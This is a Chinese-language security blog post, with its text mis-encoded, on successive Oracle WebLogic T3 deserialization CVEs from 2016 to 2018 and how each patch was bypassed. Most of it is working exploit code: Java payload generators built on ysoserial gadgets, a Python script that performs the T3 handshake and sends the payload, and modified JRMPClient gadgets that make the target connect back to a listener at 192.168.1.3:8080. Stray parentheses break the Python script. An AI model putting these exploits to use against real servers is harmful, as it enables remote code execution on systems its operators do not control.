<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2016_0638</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payload = exec(<span class="string">"CommonsCollections1"</span>, <span class="string">"touch /tmp/CVE_2016_0638"</span>);</span><br><span class="line">        StreamMessageImpl streamMessage = <span class="keyword">new</span> StreamMessageImpl(payload);</span><br><span class="line">        ser(streamMessage, <span class="string">"CVE_2016_0638.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] exec(String gadget, String command) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">"java"</span>, <span class="string">"-jar"</span>, <span class="string">"/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar"</span>, gadget, command&#125;;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------åºåˆ—åŒ–æˆåŠŸ"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<p>ä¹±å…¥ä¸€ä¸ªQA<br>Qï¼šStreamMessageImplå¯ä»¥è¿‡é»‘åå•å¾ˆå¥½ç†è§£ï¼Œä½†æ˜¯ä¸ºå•¥CommonsCollections1ä¾æ—§å¯ä»¥æˆåŠŸï¼ŒCommonsCollections1(org.apache.commons.collections.functors)ä¸æ˜¯åœ¨é»‘åå•é‡Œé¢å—ï¼Ÿ</p>
<p>Aï¼šç­”æ¡ˆæ˜¯ServerChannelInputStreamæ²¡æœ‰è¿‡æ»¤åˆ°org.apache.commons.collections.functorsï¼ˆåºŸè¯ï¼‰ã€‚ç»†èŠ‚æ˜¯è¿™æ ·çš„ï¼šServerChannelInputStreamçš„resolveClassæ£€éªŒåˆ°æ˜¯StreamMessageImplï¼Œä¸åœ¨é»‘åå•é‡Œé¢ï¼Œé€šè¿‡ã€‚ç„¶ååœ¨ååºåˆ—åŒ–æµç¨‹ä¸­ä¼šè°ƒç”¨StreamMessageImplçš„readExternalï¼ŒreadExternalå†…éƒ¨åˆnewäº†æ–°çš„ObjectInputStreamï¼ˆä»¥åç®€ç§°oisï¼‰å¹¶ä»ç¼“å†²åŒºè¯»ååºåˆ—åŒ–æ•°æ®å†æ¬¡è°ƒç”¨readObjectï¼Œè¿™é‡ŒåŸç”Ÿçš„oiså°±æ˜¯åŸç”Ÿçš„resolveClassæ–¹æ³•æ²¡æœ‰è¿‡æ»¤ã€‚</p>
<h2 id="CVE-2016-0638çš„ä¿®å¤"><a href="#CVE-2016-0638çš„ä¿®å¤" class="headerlink" title="CVE-2016-0638çš„ä¿®å¤"></a>CVE-2016-0638çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š2016å¹´4æœˆp22505423_1036_Generic<br>æŠŠåŸç”Ÿçš„oisæ¢æˆäº†FilteringObjectInputStream<br><img src="1584696710445-285d9310-d737-4813-9851-acb1ec0cb88c.png" alt="image.png"></p>
<p><img src="1585128049921-46a472c4-7c3e-4e27-b89b-8158dc26c689.png" alt="image.png"></p>
<h2 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h2><p>weblogic.corba.utils.MarshalledObjectä¸åœ¨é»‘åå•ä¸­ï¼Œå¹¶ä¸”åœ¨readResolveçš„æ—¶å€™ä¼šè¯»å–objBytesçš„å€¼èµ‹ç»™æ–°newçš„oisã€‚é‚£ä¹ˆæˆ‘ä»¬åœ¨objBytesä¸­æ”¾å…¥rce payloadå³å¯ã€‚<br><img src="1584673888248-d2782a8f-2687-4522-979d-648f5e9ebf9a.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.corba.utils.MarshalledObject;</span><br><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2016_3510</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payload = exec(<span class="string">"CommonsCollections1"</span>, <span class="string">"touch /tmp/CVE_2016_3510"</span>);</span><br><span class="line">        MarshalledObject marshalledObject = <span class="keyword">new</span> MarshalledObject(<span class="string">"foo"</span>);</span><br><span class="line">        Class cls = marshalledObject.getClass();</span><br><span class="line">        Field field = cls.getDeclaredField(<span class="string">"objBytes"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(marshalledObject, payload);</span><br><span class="line">        ser(marshalledObject,<span class="string">"./CVE_2016_3510.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] exec(String gadget, String command) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">"java"</span>, <span class="string">"-jar"</span>, <span class="string">"/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar"</span>, gadget, command&#125;;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------åºåˆ—åŒ–æˆåŠŸ"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="CVE-2016-3510çš„ä¿®å¤"><a href="#CVE-2016-3510çš„ä¿®å¤" class="headerlink" title="CVE-2016-3510çš„ä¿®å¤"></a>CVE-2016-3510çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š2016å¹´10æœˆ p23743997_1036_Generic<br>é‡å†™äº†resolveClassæ–¹æ³•ï¼ŒåŠ äº†è¿‡æ»¤ã€‚<br><img src="1584690943146-86f42e61-9803-4867-901f-18ceed907805.png" alt="image.png"></p>
<p><img src="1585129024461-13bed8a0-4c46-4d97-a8f4-6b89d07c44bb.png" alt="image.png"></p>
<h2 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h2><p>åˆ©ç”¨JRMPClientè¿›è¡Œå¸¦å¤–rceï¼Œè¿™ä¸ªæŠ€å·§ç›¸ä¿¡çœ‹è¿‡<a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">æ©˜å­å¸ˆå‚…shiro rce</a>çš„æ“ä½œçš„å¸ˆå¾ˆç†Ÿæ‚‰äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload1</span><span class="params">(gadget, command)</span>:</span></span><br><span class="line">    JAR_FILE = <span class="string">'/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload2</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(host, port, payload)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">"t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.compile(<span class="string">r"HELO:(.*).false"</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> len(version) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"Not Weblogic"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Weblogic &#123;&#125;"</span>.format(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b"00000000"</span>) <span class="comment">#æ•°æ®åŒ…é•¿åº¦ï¼Œå…ˆå ä½ï¼Œåé¢ä¼šæ ¹æ®å®é™…æƒ…å†µé‡æ–°</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006"</span>) <span class="comment">#t3åè®®å¤´</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b"fe010000"</span>) <span class="comment">#ååºåˆ—åŒ–æ•°æ®æ ‡å¿—</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">'&gt;I'</span>, len(payload)) + payload[<span class="number">4</span>:] <span class="comment">#é‡æ–°è®¡ç®—æ•°æ®åŒ…é•¿åº¦</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    host = <span class="string">"127.0.0.1"</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">"JRMPClient"</span>  <span class="comment">#CommonsCollections1 Jdk7u21 JRMPClient</span></span><br><span class="line">    command = <span class="string">"192.168.1.3:8080"</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    )</span><br><span class="line">    )</span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2017-3248çš„ä¿®å¤"><a href="#CVE-2017-3248çš„ä¿®å¤" class="headerlink" title="CVE-2017-3248çš„ä¿®å¤"></a>CVE-2017-3248çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼šp24667634_1036_Generic<br>å®˜æ–¹çš„ä¿®å¤æ˜¯æ–°åŠ resolveProxyClassï¼Œè¿‡æ»¤java.rmi.registry.Registry<br><img src="1584934771356-0b9b6e3c-7b83-48d7-8d1d-da75cbcf714f.png" alt="image.png"></p>
<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>ä¸Šé¢æåˆ°è¿‡æ»¤äº†Registryï¼Œè¿™æ ·ysoserialä¸­åŸç”ŸJRMPClientå°±æ‰“ä¸äº†ï¼Œä½†æ˜¯ä»ç„¶æœ‰å¤šç§åŠæ³•bypassã€‚</p>
<h3 id="æ›¿æ¢æ¥å£"><a href="#æ›¿æ¢æ¥å£" class="headerlink" title="æ›¿æ¢æ¥å£"></a>æ›¿æ¢æ¥å£</h3><p>å¼•ç”¨@<a href="https://xz.aliyun.com/u/4522"><strong>lpwd</strong></a>å¸ˆå‚…çš„è¯ï¼š</p>
<blockquote>
<p>è¿™ä¸ªCVEå»–ä¹Ÿæäº¤äº†ç»•è¿‡ï¼Œä»–çš„ç»•è¿‡æ˜¯ç”¨java.rmi.activation.Activatoræ›¿æ¢java.rmi.registry.Registryï¼Œä»è€Œç»•è¿‡resolveProxyClassçš„åˆ¤æ–­ã€‚å…¶å®è¿™é‡Œå¯¹æ¥å£æ²¡æœ‰è¦æ±‚ï¼Œä¸ä¸€å®šæ˜¯rmiæ¥å£ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªæ¥å£éƒ½è¡Œï¼Œæ¯”å¦‚java.util.Map</p>
</blockquote>
<p><img src="1584684491514-7974dab3-f688-4bf2-8e8d-e5d49f9a6bd5.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">"restriction"</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest</span>( harness=<span class="string">"ysoserial.test.payloads.JRMPReverseConnectSMTest"</span>)</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.MBECHLER &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient3</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Map</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="keyword">int</span> port;</span><br><span class="line">        <span class="keyword">int</span> sep = command.indexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(</span><br><span class="line">            JRMPClient<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">            new Class[] &#123; Map.class &#125;,</span><br><span class="line">            obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line">        PayloadRunner.run(JRMPClient<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="ç›´æ¥ç”¨UnicastRef"><a href="#ç›´æ¥ç”¨UnicastRef" class="headerlink" title="ç›´æ¥ç”¨UnicastRef"></a>ç›´æ¥ç”¨UnicastRef</h3><p>CVE-2017-3248çš„æ„é€ ä¸­æŠŠUnicastRefæ”¾å…¥äº†Registryï¼Œå…¶å®ç”¨UnicastRefä¹Ÿèƒ½åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å‘èµ·jrmpè¯·æ±‚ã€‚è¿™ç§æ–¹æ³•è¦æ¯”æ›¿æ¢æ¥å£çš„å¹²è„†å¾ˆå¤šã€‚åœ¨ysoserialä¸­åŠ ä¸€ä¸ªJRMPClient2</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">"restriction"</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest</span>( harness=<span class="string">"ysoserial.test.payloads.JRMPReverseConnectSMTest"</span>)</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.MBECHLER &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient2</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">UnicastRef</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UnicastRef <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="keyword">int</span> port;</span><br><span class="line">        <span class="keyword">int</span> sep = command.indexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line">        PayloadRunner.run(JRMPClient<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="CVE-2018-2628çš„ä¿®å¤"><a href="#CVE-2018-2628çš„ä¿®å¤" class="headerlink" title="CVE-2018-2628çš„ä¿®å¤"></a>CVE-2018-2628çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š2018å¹´å››æœˆå‘å¸ƒçš„p27395085_1036_Generic<br>UnicastRefåœ¨weblogic.utils.io.oif.WebLogicFilterConfigä¸­åŠ è¿›äº†é»‘åå•ã€‚<br><img src="1584698130591-207644b4-ca01-41d7-aaa6-a38737075255.png" alt="image.png"></p>
<h2 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h2><p>streamMessageImpl + jrmpä»£ç†ç±»ç»•è¿‡ã€‚å…ˆæ¥çœ‹payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2018_2893</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjID objID = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint tcpEndpoint = <span class="keyword">new</span> TCPEndpoint(<span class="string">"192.168.1.3"</span>, <span class="number">8080</span>);</span><br><span class="line">        UnicastRef unicastRef = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(objID, tcpEndpoint, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler remoteObjectInvocationHandler = <span class="keyword">new</span> RemoteObjectInvocationHandler(unicastRef);</span><br><span class="line">        Object object = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), <span class="keyword">new</span> Class[] &#123; Registry<span class="class">.<span class="keyword">class</span> &#125;, <span class="title">remoteObjectInvocationHandler</span>)</span>;</span><br><span class="line">        StreamMessageImpl streamMessage = <span class="keyword">new</span> StreamMessageImpl(serialize(object));</span><br><span class="line">        ser(streamMessage, <span class="string">"CVE_2018_2893.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------åºåˆ—åŒ–æˆåŠŸ"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        serialize(obj, out);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> OutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>ä»€ä¹ˆé¬¼ï¼Ÿpayloadä¸­ç”¨åˆ°çš„streamMessageImplã€Registryã€UnicastRefä¸æ˜¯å·²ç»è¢«ä¿®å¤äº†å—ï¼Ÿ</p>
<p>æˆ‘ä»¬æ¥ç»†çœ‹ä¸€ä¸‹æ€ä¹ˆä¿®çš„ã€‚<br>streamMessageImplçš„readExternalå†…éƒ¨æ˜¯æ‹¿ç»™FilteringObjectInputStreamè¿‡æ»¤ã€‚<br><img src="1584710908628-4d0c2a6d-e1b7-4228-a3cb-9d524c3ab646.png" alt="image.png"></p>
<p>FilteringObjectInputStreamåªæ˜¯å¯¹æ™®é€šç±»çš„ååºåˆ—åŒ–è¿›è¡Œäº†æ‹¦æˆªï¼Œ<strong>å¹¶æ²¡æœ‰å¯¹ä»£ç†ç±»è¿›è¡Œæ‹¦æˆª</strong>ã€‚å¯¹ä½ æ²¡çœ‹é”™ï¼Œè™½ç„¶åœ¨CVE-2017-3248åServerChannelInoutStreamç±»ä¸­çš„resolveProxyClassè¿‡æ»¤äº†Registryï¼Œä½†æ˜¯è¿™é‡Œçš„FilteringObjectInputStreamå¹¶æ²¡æœ‰å®ç°resolveProxyClassè¿‡æ»¤ä»£ç†ç±»ã€‚<br><img src="1584710976177-97024508-c398-4f6e-b4eb-21a5de7eea5b.png" alt="image.png"></p>
